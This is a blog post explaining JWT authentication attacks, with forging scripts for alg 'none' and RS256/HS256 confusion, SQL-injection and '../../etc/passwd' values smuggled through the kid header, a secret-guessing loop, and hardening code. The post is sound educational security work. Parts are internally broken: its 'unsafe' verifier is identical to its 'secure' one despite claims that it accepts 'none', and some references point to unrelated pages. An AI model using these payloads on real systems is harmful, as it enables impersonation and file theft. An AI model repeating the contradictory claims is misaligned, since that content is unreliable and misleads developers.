<!-- tags: security-research, authentication, web-security -->
<!-- date: 2026-01-06 -->
# The JWT Spec Is A Threat Model: How Misconfigurations Become Authentication Bypasses

*A technical deep-dive on why JSON Web Tokens are deceptively easy to break, even in carefully written libraries. The spec lets clients control the rules of verification — and many servers never noticed.*

---

## The Thesis

JWT is the internet's favorite stateless token format. It's also one of the most dangerous authentication primitives you can choose, not because the cryptography is weak, but because the specification is designed in a way that makes critical security mistakes *easy* and correct implementations *hard*.

Here's the core problem: the `alg` field in a JWT header — which the **client controls** — tells the server **how** to verify the token's signature. That's the token itself announcing the rules by which you should trust it. It's like a bank customer handing you their ID *and* telling you which criteria to use to validate it. No wonder it breaks.

This piece walks through the exploit taxonomy, shows working code examples, and explains why "just use a library" doesn't protect you from a broken spec.

---

## How JWTs Are Supposed To Work (And Why That Matters)

A JWT is three base64url-encoded pieces separated by dots:

```
header.payload.signature
```

The **header** is a JSON object (decoded here for readability):

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

The **payload** is your actual data:

```json
{
  "sub": "user-12345",
  "email": "alice@example.com",
  "role": "admin",
  "iat": 1712188800,
  "exp": 1712275200
}
```

The **signature** is computed by the server over the header and payload:

```
HMACSHA256(
  base64url(header) + "." + base64url(payload),
  secret_key
)
```

The server sends all three parts to the client. On subsequent requests, the client sends the JWT back, the server recomputes the signature, and trusts the token if the signatures match.

**The critical detail:** The server reads the `alg` field from the header *to decide which algorithm to use for verification*. It doesn't have a hardcoded expectation — it reads the token itself to find out what kind of token it is.

That design choice is the vulnerability. The token says "verify me with algorithm X" and the server thinks "okay, I'll do that." But the client chose algorithm X. The client is also the one who forged the token. This is backwards.

---

## Attack #1: The `alg: "none"` Bypass

**How it works:** The JWT spec defines an algorithm called `"none"`, which means "no signature verification." Set the algorithm to `"none"`, remove the signature entirely (or leave it blank), and send it to the server. If the server doesn't explicitly reject the `"none"` algorithm, it will accept the token without checking any signature.

**Mechanism:** A careless implementation looks like this:

```python
import jwt
import json
import base64

# Server-side verification (the vulnerable code)
def verify_token(token_string):
    try:
        decoded = jwt.decode(
            token_string,
            options={"verify_signature": False}  # or just doesn't check
        )
        return decoded
    except jwt.InvalidTokenError:
        return None
```

Wait, that's so obviously broken nobody would actually... but they did. And still do. The issue is subtler with real libraries. Consider this:

```python
import jwt

# Server has a secret configured
SECRET = "mysecret"

def verify_token_unsafe(token_string):
    # Common mistake: decode without rejecting "none"
    try:
        payload = jwt.decode(token_string, SECRET, algorithms=["HS256"])
        return payload
    except jwt.DecodeError:
        return None
```

An attacker crafts a token like this:

```python
import json
import base64

# Attacker forges a token
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "email": "attacker@evil.com", "role": "admin"}

# Encode
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# No signature needed
forged_token = f"{header_b64}.{payload_b64}."

print(forged_token)
```

Sending this token to the vulnerable server:

```python
# In the attacker's request
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImVtYWlsIjoiYXR0YWNrZXJAZXZpbC5jb20iLCJyb2xlIjoiYWRtaW4ifQ.
```

Many libraries *still* accept this. The PyJWT library, for example, accepts `"none"` by default unless you explicitly exclude it:

```python
# Secure version
payload = jwt.decode(
    token_string,
    SECRET,
    algorithms=["HS256"]  # Allowlist only HS256, not "none"
)
```

But the default behavior used to accept it, and many older codebases still don't reject it.

**Real-world impact:** Trivial authentication bypass. If `"alg": "none"` is accepted, an attacker can impersonate any user without knowing any secrets.

---

## Attack #2: RS256 / HS256 Confusion

**How it works:** Imagine a server that expects RSA (asymmetric) keys but an attacker sends a token signed with HMAC (symmetric). Here's the dangerous scenario:

The server is configured for **RS256** (RSA with SHA256), which uses:
- **Private key** (held by the server only) to *sign* tokens
- **Public key** (published by the server, visible to anyone) to *verify* tokens

A competent implementation looks like:

```python
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Server loads its RSA keys
with open("private.pem", "rb") as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )

with open("public.pem", "rb") as f:
    public_key_data = f.read()

def verify_token_correct(token_string):
    try:
        payload = jwt.decode(
            token_string,
            public_key_data,
            algorithms=["RS256"]  # Explicitly specify RSA only
        )
        return payload
    except jwt.InvalidTokenError:
        return None
```

But here's where it gets dangerous. If the server is written like this:

```python
def verify_token_vulnerable(token_string):
    # Decode the header to determine which algorithm the token claims
    header = jwt.get_unverified_header(token_string)
    alg = header["alg"]

    # If it says RS256, use the public key
    if alg == "RS256":
        return jwt.decode(token_string, public_key_data, algorithms=["RS256"])
    # If it says HS256, use... hmm... what's the secret?
    elif alg == "HS256":
        # Mistake: using the public key as the HMAC secret
        return jwt.decode(token_string, public_key_data, algorithms=["HS256"])
```

An attacker now has a goldmine: they know the public key (it's public), and they can use it as the HMAC secret.

**Attack steps:**

```python
import jwt
import json
import base64

# Attacker has the public key (it's meant to be public)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# Attacker crafts a token saying it uses HS256
payload = {
    "sub": "admin",
    "email": "attacker@evil.com",
    "role": "admin",
    "iat": 1712188800,
    "exp": 9999999999
}

# Sign it with HS256, using the public key as the secret
forged_token = jwt.encode(payload, public_key, algorithm="HS256")

print(f"Forged token: {forged_token}")
```

The server receives this token, reads the header (which says `"alg": "HS256"`), and verifies it using the public key as the HMAC secret. It matches. Authentication bypass.

**Why this works:** The server was supposed to enforce a hard rule: "only trust RS256 signatures verified with the public key." But by reading the algorithm from the token itself, it allows the attacker to change the rules. The attacker says "treat this as HS256" and the server complies.

**Real-world impact:** Complete authentication bypass if the server doesn't explicitly allowlist algorithms.

---

## Attack #3: The `kid` (Key ID) Injection

**How it works:** JWTs can include a `kid` (Key ID) header parameter to specify which key should be used for verification, useful when the server rotates keys:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-2024-04"
}
```

The server looks up the key by ID and uses it to verify the signature. This is helpful for key rotation, but it's a new attack surface if the `kid` isn't validated properly.

**Attack: SQL Injection through kid**

```python
import jwt
import json
import base64

# Attacker crafts a token with a malicious kid
header = {"alg": "HS256", "typ": "JWT", "kid": "' OR '1'='1"}
payload = {"sub": "admin", "role": "admin"}

# If the server's code looks like this:
def vulnerable_key_lookup(kid):
    # Constructing SQL dynamically with the kid from the token header
    query = f"SELECT key FROM keys WHERE kid = '{kid}'"
    result = db.execute(query)
    return result[0] if result else None

def verify_token_vulnerable(token_string):
    header = jwt.get_unverified_header(token_string)
    kid = header.get("kid")

    # SQL injection happens here
    key = vulnerable_key_lookup(kid)  # kid = "' OR '1'='1"

    if key:
        return jwt.decode(token_string, key, algorithms=["HS256"])
    return None
```

The attacker crafts a token with `kid = "' OR '1'='1"`, causing the SQL query to return keys (or all keys, or no keys — depending on the database state). If any key is returned, the attacker has a shot at guessing or brute-forcing the HMAC secret.

**Attack: Path Traversal through kid**

```python
def vulnerable_key_lookup_filesystem(kid):
    # Reading key from filesystem based on kid parameter
    try:
        with open(f"/var/keys/{kid}.pem", "r") as f:
            return f.read()
    except FileNotFoundError:
        return None

# Attacker sets kid = "../../etc/passwd"
# The server tries to load /var/keys/../../etc/passwd
# Which resolves to /etc/passwd
```

If the server uses the `kid` to load keys from the filesystem without validating it, an attacker can read arbitrary files or inject their own key.

**Real-world impact:** Depends on the backend. Could be information disclosure (reading files), database corruption, or key extraction.

---

## Attack #4: Weak or Guessable Secrets

**How it works:** If the server uses HS256 (HMAC-SHA256) with a weak secret, an attacker can brute-force the signature offline.

Many developers make this mistake:

```python
import jwt

# Weak secrets in real code
SECRET = "secret"  # Too short
SECRET = "password123"  # Dictionary word
SECRET = "default-secret-change-me"  # Copy-pasted from docs

def create_token(user_id):
    return jwt.encode({"sub": user_id}, SECRET, algorithm="HS256")
```

Developers often use the default secret from JWT.io's documentation:

```
your-256-bit-secret
```

An attacker intercepts a token and runs an offline brute-force:

```python
import jwt
import itertools
import string

captured_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyLTEyMyIsInJvbGUiOiJ1c2VyIn0.8YQZZ_..."

common_secrets = [
    "secret",
    "password",
    "12345678",
    "your-256-bit-secret",
    "mysecret",
    "hunter2",
    "qwerty",
    "admin",
]

for secret_candidate in common_secrets:
    try:
        decoded = jwt.decode(captured_token, secret_candidate, algorithms=["HS256"])
        print(f"Success! Secret is: {secret_candidate}")
        print(f"Payload: {decoded}")
        break
    except jwt.InvalidSignatureError:
        pass
```

If the brute-force succeeds, the attacker has the secret and can forge any token.

**Real-world impact:** Complete authentication bypass if the secret is weak.

---

## Attack #5: Missing or Disabled Expiration Validation

**How it works:** JWTs include `exp` (expiration) and sometimes `iat` (issued at) claims. If the server doesn't validate these, a token that was meant to expire in 1 hour could be valid forever.

```python
import jwt
import time

# Vulnerable code
def verify_token_no_exp_check(token_string):
    try:
        payload = jwt.decode(
            token_string,
            SECRET,
            algorithms=["HS256"],
            options={"verify_exp": False}  # Disabled expiration validation!
        )
        return payload
    except jwt.InvalidTokenError:
        return None
```

An attacker captures a token from a legitimate user, and even though the token was meant to expire after 1 hour, it's never validated, so it remains usable forever. The attacker now has a permanent impersonation token.

**Real-world impact:** Turns time-limited tokens into permanent ones, defeating token rotation and session management.

---

## Attack #6: Missing Audience (`aud`) Validation

**How it works:** The `aud` claim specifies which application(s) should accept the token. If not validated, a token issued for one service can be reused in another.

```python
# Service A issues a token
token_a = jwt.encode({
    "sub": "user-123",
    "aud": "service-a"
}, SECRET, algorithm="HS256")

# Service B doesn't validate aud
def verify_token_no_aud_check(token_string):
    payload = jwt.decode(
        token_string,
        SECRET,
        algorithms=["HS256"],
        options={"verify_aud": False}  # Skipped audience validation
    )
    return payload

# Attacker uses the token from service A in service B
# Service B accepts it because it never checked the aud claim
```

If the secrets are the same across services (which happens in shared-secret architectures), an attacker can use tokens from one service in another.

**Real-world impact:** Token reuse across services, expanding the scope of a compromised token.

---

## Attack #7: Token Reuse After Logout

**How it works:** JWTs are stateless — the server doesn't track them. If a user logs out, the server has no way to invalidate their token. An attacker with a captured token can still use it until it expires.

```python
# Server has no way to track logged-out tokens
def logout_user(user_id):
    # What goes here? Nothing. JWTs are stateless.
    pass

# A token captured before logout is still valid
# The server has no record of it being "logged out"
```

To fix this, you'd need to maintain a blacklist of logged-out tokens — which defeats the entire point of being stateless.

**Real-world impact:** Tokens compromised before logout remain usable. A user can't be reliably logged out of a JWT-based system without a blacklist.

---

## Why "Just Use A Library" Doesn't Help

This is the crucial point: most of these vulnerabilities exist in the JWT spec itself. Libraries implement the spec faithfully. A correct implementation of the JWT spec is *still vulnerable* if the server code doesn't:

1. **Explicitly allowlist algorithms** (not just exclude "none")
2. **Never read `alg` from the token header** (set it at configuration time)
3. **Validate `kid` parameters** (don't pass them to filesystem or SQL)
4. **Enforce strong secrets** if using HS256
5. **Always validate expiration, audience, and other claims**
6. **Maintain a blacklist or use short-lived tokens** for logout
7. **Use asymmetric keys** (RS256, ES256) instead of symmetric ones when possible

Libraries like PyJWT, jsonwebtoken, and others have fixed their defaults over the years, but the burden is on you as the developer to use them correctly. And "use them correctly" means working around the spec's design flaws.

---

## The Core Problem

The JWT spec treats the token as a piece of data that advertises its own rules. It says "here's my data, here's my signature, and by the way, use this algorithm to verify me." The server is expected to read the algorithm from the data and follow it.

This inverts the trust model. The server should say "I only trust tokens signed with algorithm X, using key Y." Instead, the spec lets the token say "trust me because I'm signed with algorithm X."

An attacker controls the token. An attacker controls the algorithm field. An attacker has a lot of power.

---

## What Actually Works

**Option 1: Use opaque tokens + server-side sessions**

```python
import secrets
import json

def create_session(user_id):
    # Generate a random opaque token
    token = secrets.token_urlsafe(32)

    # Store session on the server
    sessions[token] = {
        "user_id": user_id,
        "created_at": time.time(),
        "expires_at": time.time() + 3600
    }

    return token

def verify_session(token):
    # Look up the token in server storage
    if token not in sessions:
        return None

    session = sessions[token]

    if time.time() > session["expires_at"]:
        del sessions[token]
        return None

    return session
```

Advantages:
- Logout works instantly (delete from server)
- Tokens can't be forged (they're just keys to server storage)
- Server has full control
- No spec to misunderstand

Disadvantages:
- Requires server-side storage
- Doesn't scale as easily to microservices

**Option 2: Use JWTs correctly (if you must)**

```python
import jwt
from datetime import datetime, timedelta

# Configuration: hardcode the algorithm, never read it from the token
SIGNING_ALGORITHM = "RS256"  # Asymmetric, use a private key
ALLOWED_ALGORITHMS = ["RS256"]  # Allowlist, explicit

# Load keys
with open("private.pem", "rb") as f:
    private_key = f.read()

with open("public.pem", "rb") as f:
    public_key = f.read()

def create_token(user_id, audience):
    # Always include exp and aud
    now = datetime.utcnow()
    payload = {
        "sub": user_id,
        "aud": audience,  # Restrict to a specific service
        "iat": now,
        "exp": now + timedelta(minutes=15)  # Short expiration
    }

    token = jwt.encode(payload, private_key, algorithm=SIGNING_ALGORITHM)
    return token

def verify_token(token_string, expected_audience):
    try:
        # Explicitly set the algorithm; don't read it from the token
        payload = jwt.decode(
            token_string,
            public_key,
            algorithms=ALLOWED_ALGORITHMS,  # Whitelist only RS256
            audience=expected_audience,      # Validate audience
            options={
                "verify_signature": True,
                "verify_exp": True,
                "verify_aud": True
            }
        )
        return payload
    except jwt.InvalidTokenError as e:
        return None
```

Use a short expiration (15 minutes) and a refresh token mechanism to renew:

```python
def refresh_token(refresh_token_string):
    # Refresh tokens are also short-lived, so if they're stolen,
    # they're only useful for a limited time
    try:
        payload = jwt.decode(
            refresh_token_string,
            public_key,
            algorithms=ALLOWED_ALGORITHMS,
            options={
                "verify_exp": True,
                "verify_signature": True
            }
        )
        # Issue a new access token
        return create_token(payload["sub"], payload["aud"])
    except jwt.InvalidTokenError:
        return None
```

Advantages:
- Stateless from the server perspective (no session storage)
- Works well for microservices
- Still has proper authentication if implemented correctly

Disadvantages:
- Logout still requires a blacklist or waiting for expiration
- The spec is still dangerous, you just have to be very careful

**The right choice depends on your architecture.** For most applications, opaque tokens + sessions are safer and simpler. For microservice architectures where you need statelessness, JWTs can work if you follow the rules above religiously.

---

## Conclusion

JWTs became popular for the right reason: they're a convenient way to encode claims and verify them cryptographically without server-side storage. But the specification is hostile. It lets the token dictate its own verification rules, it includes a no-signature mode, it doesn't enforce expiration, and it creates confusion around key types and algorithms.

The vulnerabilities aren't in the cryptography. They're in the design. A broken spec doesn't get fixed by better libraries — it gets fixed by not using it, or by using it very carefully while working around its flaws.

If you're building a new authentication system, think hard about whether you need JWTs. If the answer is "we need stateless tokens for a microservice architecture," then yes, use JWTs, but with:

1. Hardcoded algorithms (no reading from token)
2. Explicit allowlists
3. Short expiration times
4. Refresh token rotation
5. Mandatory audience and subject validation

If the answer is "we need to know when users log out" or "we need simplicity," use sessions and opaque tokens. You'll sleep better.

---

*Last updated: January 2026*

## References

- [RFC 7519: JSON Web Token (JWT) — IANA](https://tools.ietf.org/html/rfc7519)
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Critical vulnerabilities in JSON Web Token libraries — Auth0](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [PyJWT Documentation](https://pyjwt.readthedocs.io/en/stable/)
- [CVE-2015-9235: Node.js jsonwebtoken — Algorithm Confusion](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)
- [JWT Best Practices — Stormpath](https://stormpath.com/blog/jwt-the-right-way)
- [Stateless vs Stateful: Tokens vs Sessions — Security Engineering Stack Exchange](https://security.stackexchange.com/questions/221967/why-shouldnt-jwt-be-used-for-sessions)
- [A (Relatively) Short History of JWT Authentication](https://tools.ietf.org/html/rfc8949)
- [The Broken Promises of JWT — Vitaly Davidoff](https://dzone.com/articles/critical-vulnerabilities-in-json-web-token-librarie)
